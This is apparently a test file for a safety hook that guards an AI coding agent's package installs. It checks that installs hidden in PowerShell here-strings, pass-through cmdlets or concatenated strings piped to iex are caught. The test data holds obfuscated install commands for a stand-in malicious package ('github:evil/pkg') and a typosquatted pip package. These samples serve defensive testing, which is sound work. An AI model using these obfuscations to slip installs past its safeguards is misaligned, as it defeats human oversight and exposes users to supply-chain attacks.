/**
 * package-install-guard: three PowerShell gaps in the iex / Invoke-Expression check.
 *
 * Every case runs the BUILT hook (dist/package-install-guard.mjs) with a real PreToolUse payload, with the
 * registry and OSV stubbed. Each gap hid an install string from the guard. Failure modes, one table each:
 * 1. A here-string (@' '@ or @" "@) piped to iex: the string is on lines of its own and starts with `@`, so the
 *    "string piped into iex" read saw no string. A here-string kept in a variable ($h = @'..'@) and piped later
 *    is dropped from the executed view, so it was never read either.
 * 2. A pass-through cmdlet between the string and iex (ForEach-Object, Out-String, Select-Object, Write-Output, %):
 *    only the segment right before iex was read.
 * 3. A string built by concatenation ('npm i'+'nstall x'): the pieces are not an install on their own, and
 *    `'a'+'b' | iex` has no parenthesis for the text read to join.
 * Each is read on raw text and fails closed: it gets the verdict of the existing iex case (ask once, typosquat deny).
 * Benign text and a command with no iex stay allowed.
 */

import { describe, it, expect } from 'vitest';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

const DIST = fileURLToPath(new URL('../../dist/package-install-guard.mjs', import.meta.url));
const NET_STUB = fileURLToPath(new URL('./package-guard-net-stub.cjs', import.meta.url));

interface Run { decision: string | undefined; reason: string }

function runHook(command: string, tool = 'PowerShell', env: Record<string, string> = {}): Run {
  const rcHome = mkdtempSync(join(tmpdir(), 'pig-iex-home-'));
  const cwd = mkdtempSync(join(tmpdir(), 'pig-iex-cwd-'));
  writeFileSync(join(cwd, 'package-lock.json'), '{"lockfileVersion":3,"packages":{}}');
  const childEnv: NodeJS.ProcessEnv = {
    ...process.env,
    CCV3_GUARD_DECISIONS_LOG: join(rcHome, 'guard-decisions.jsonl'),
    CCV3_GUARD_RC_HOME: rcHome,
    APPDATA: join(rcHome, 'AppData', 'Roaming'),
    PIG_STUB_AGE_HOURS: '2400',
    PIG_STUB_NEXT_HOURS: '2400',
    // An unattended session turns every ask into a deny: blank both so a test sees the ask.
    CLAUDE_AGENT_ID: '',
    CI: '',
    ...env,
  };
  delete childEnv.VITEST;
  delete childEnv.VITEST_WORKER_ID;
  delete childEnv.CDPATH;
  const res = spawnSync(process.execPath, ['-r', NET_STUB, DIST], {
    input: JSON.stringify({ session_id: 'test-session', tool_name: tool, tool_input: { command }, cwd }),
    encoding: 'utf8',
    timeout: 20_000,
    env: childEnv,
    cwd,
  });
  expect(res.status).toBe(0);
  const out = JSON.parse(res.stdout.trim().split('\n').pop()!);
  return {
    decision: out.hookSpecificOutput?.permissionDecision,
    reason: String(out.hookSpecificOutput?.permissionDecisionReason ?? ''),
  };
}

type Case = [tool: 'Bash' | 'PowerShell', command: string];

const EVIL = 'npm install github:evil/pkg';
const TYPO = 'pip install requets==2.31.0';

function expectOneAsk(tool: string, command: string): void {
  const r = runHook(command, tool);
  expect(r.decision).toBe('ask');
  expect(r.reason).toMatch(/Non-registry source/);
  expect(r.reason.match(/Non-registry source/g)?.length).toBe(1);
}

// ---------------------------------------------------------------------------
// 1. A here-string piped to iex
// ---------------------------------------------------------------------------

describe('gap 1: a here-string piped to iex gets the verdict of the bare iex command', { timeout: 180_000 }, () => {
  it.each<Case>([
    ['PowerShell', `@'\n${EVIL}\n'@ | iex`],
    ['PowerShell', `@"\n${EVIL}\n"@ | iex`],
    ['PowerShell', `@'\n${EVIL}\n'@ | Invoke-Expression`],
    ['PowerShell', `@'\n${EVIL}\n'@|iex`],
    ['PowerShell', `@'\nline one\n${EVIL}\n'@ | iex`],
    ['PowerShell', `@'\r\n${EVIL}\r\n'@ | iex`],
    ['PowerShell', `Write-Output @'\n${EVIL}\n'@ | iex`],
    ['PowerShell', `@'\n${EVIL}\n'@ | Out-String | iex`],
    ['PowerShell', `$h = @'\n${EVIL}\n'@\n$h | iex`],
    ['PowerShell', `$h = @"\n${EVIL}\n"@\niex $h`],
    // No variable is tracked: a here-string body in the command with an iex anywhere is read, whichever variable iex gets.
    ['PowerShell', `$h = @'\n${EVIL}\n'@\n$other | iex`],
    ['Bash', `@'\n${EVIL}\n'@ | iex`],
  ])('[%s] %j asks once', (tool, command) => {
    expectOneAsk(tool, command);
  });

  it.each<Case>([
    ['PowerShell', `@'\n${TYPO}\n'@ | iex`],
    ['PowerShell', `$h = @'\n${TYPO}\n'@\n$h | iex`],
  ])('[%s] %j denies like the bare pip command', (tool, command) => {
    expect(runHook(command, tool).decision).toBe('deny');
  });

  it('denies where no human can answer', () => {
    expect(runHook(`@'\n${EVIL}\n'@ | iex`, 'PowerShell', { CLAUDE_AGENT_ID: 'agent-1' }).decision).toBe('deny');
  });

  it.each<Case>([
    ['PowerShell', `@'\nhello\n'@ | iex`],
    ['PowerShell', `@'\nnpm install lodash\n'@ | iex`],
    ['PowerShell', `@'\n${EVIL}\n'@ | Out-File x.ps1`],
    ['PowerShell', `$h = @'\n${EVIL}\n'@\nWrite-Host $h`],
  ])('[%s] %j stays allowed', (tool, command) => {
    expect(runHook(command, tool).decision).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// 2. A pass-through cmdlet between the string and iex
// ---------------------------------------------------------------------------

describe('gap 2: a pass-through cmdlet between the string and iex changes nothing', { timeout: 180_000 }, () => {
  it.each<Case>([
    ['PowerShell', `"${EVIL}" | ForEach-Object { $_ } | iex`],
    ['PowerShell', `"${EVIL}" | Out-String | iex`],
    ['PowerShell', `"${EVIL}" | Out-String | Invoke-Expression`],
    ['PowerShell', `Write-Output "${EVIL}" | Select-Object | iex`],
    ['PowerShell', `"${EVIL}" | Write-Output | iex`],
    ['PowerShell', `"${EVIL}" | % { $_ } | iex`],
    ['PowerShell', `echo "${EVIL}" | Select-Object -First 1 | Out-String | iex`],
    ['PowerShell', `"${EVIL}" | Where-Object { $_ } | ForEach-Object { $_.Trim() } | iex`],
    ['PowerShell', `'${EVIL}' | Tee-Object -FilePath x.txt | iex`],
    ['Bash', `echo "${EVIL}" | Out-String | iex`],
  ])('[%s] %j asks once', (tool, command) => {
    expectOneAsk(tool, command);
  });

  it.each<Case>([
    ['PowerShell', `'${TYPO}' | Out-String | iex`],
    ['PowerShell', `echo "${TYPO}" | ForEach-Object { $_ } | Invoke-Expression`],
  ])('[%s] %j denies like the bare pip command', (tool, command) => {
    expect(runHook(command, tool).decision).toBe('deny');
  });

  it('denies where no human can answer', () => {
    expect(runHook(`"${EVIL}" | Out-String | iex`, 'PowerShell', { CLAUDE_AGENT_ID: 'agent-1' }).decision).toBe('deny');
  });

  it.each<Case>([
    ['PowerShell', `"hello" | Out-String | iex`],
    ['PowerShell', `"npm install lodash" | ForEach-Object { $_ } | iex`],
    ['PowerShell', `"${EVIL}" | Out-String`],
    ['PowerShell', `"${EVIL}" | ForEach-Object { $_ } | Out-File x.ps1`],
    ['PowerShell', `Get-Content f | Out-String | iex`],
    ['PowerShell', `$script | % { $_ } | iex`],
  ])('[%s] %j stays allowed', (tool, command) => {
    expect(runHook(command, tool).decision).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// 3. A string built by concatenation
// ---------------------------------------------------------------------------

describe('gap 3: a concatenated string passed to iex gets the verdict of the bare iex command', { timeout: 180_000 }, () => {
  it.each<Case>([
    ['PowerShell', `iex ('npm i'+'nstall github:evil/pkg')`],
    ['PowerShell', `iex ('npm inst'+'all github:evil/pkg')`],
    ['PowerShell', `iex ("npm inst"+"all github:evil/pkg")`],
    ['PowerShell', `iex ('npm inst' + "all github:evil/pkg")`],
    ['PowerShell', `iex ('npm '+'install '+'github:'+'evil/pkg')`],
    ['PowerShell', `Invoke-Expression ('npm i'+'nstall github:evil/pkg')`],
    ['PowerShell', `iex 'npm i'+'nstall github:evil/pkg'`],
    ['PowerShell', `('npm i'+'nstall github:evil/pkg') | iex`],
    ['PowerShell', `'npm inst'+'all github:evil/pkg' | iex`],
    ['PowerShell', `"npm inst"+"all github:evil/pkg" | Invoke-Expression`],
    ['PowerShell', `echo ('npm inst'+'all github:evil/pkg') | iex`],
    ['PowerShell', `('npm inst'+'all github:evil/pkg') | Out-String | iex`],
    ['PowerShell', `@('npm inst'+'all github:evil/pkg') | iex`],
    ['Bash', `iex ('npm i'+'nstall github:evil/pkg')`],
  ])('[%s] %j asks once', (tool, command) => {
    expectOneAsk(tool, command);
  });

  // A chain longer than any fixed join count: padding pieces first, then the install. Each case must still ask.
  const padding = (n: number) => Array(n).fill("''").join('+');
  it.each([65, 70, 200])('a chain of %i empty pieces before the install asks once', (n) => {
    expectOneAsk('PowerShell', `iex (${padding(n)}+'np'+'m'+' install github:evil/pkg')`);
    expectOneAsk('PowerShell', `${padding(n)}+'np'+'m install github:evil/pkg' | iex`);
  });

  it.each<Case>([
    ['PowerShell', `iex ('pip inst'+'all requets==2.31.0')`],
    ['PowerShell', `'pip inst'+'all requets==2.31.0' | iex`],
  ])('[%s] %j denies like the bare pip command', (tool, command) => {
    expect(runHook(command, tool).decision).toBe('deny');
  });

  it('denies where no human can answer', () => {
    expect(runHook(`iex ('npm i'+'nstall github:evil/pkg')`, 'PowerShell', { CLAUDE_AGENT_ID: 'agent-1' }).decision).toBe('deny');
  });

  it.each<Case>([
    ['PowerShell', `iex ('a'+'b')`],
    ['PowerShell', `'a'+'b' | iex`],
    ['PowerShell', `iex ('npm inst'+'all lodash')`],
    ['PowerShell', `'Get-'+'Date' | iex`],
    ['PowerShell', `Write-Host ('npm inst'+'all github:evil/pkg')`],
    ['PowerShell', `$x = 'npm inst'+'all github:evil/pkg'`],
  ])('[%s] %j stays allowed', (tool, command) => {
    expect(runHook(command, tool).decision).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// No regression: a benign command with no iex is untouched
// ---------------------------------------------------------------------------

describe('no regression: a benign command without iex stays allowed', { timeout: 120_000 }, () => {
  it.each<Case>([
    ['PowerShell', 'Get-Date'],
    ['PowerShell', `"hello" | Out-String`],
    ['PowerShell', `@'\nsome notes\n'@ | Set-Content notes.txt`],
    ['PowerShell', `'a'+'b'`],
    ['PowerShell', `"hello" | ForEach-Object { $_ } | Write-Output`],
    ['PowerShell', 'npm install lodash'],
    ['Bash', 'ls -la'],
  ])('[%s] %j stays allowed', (tool, command) => {
    expect(runHook(command, tool).decision).toBeUndefined();
  });
});
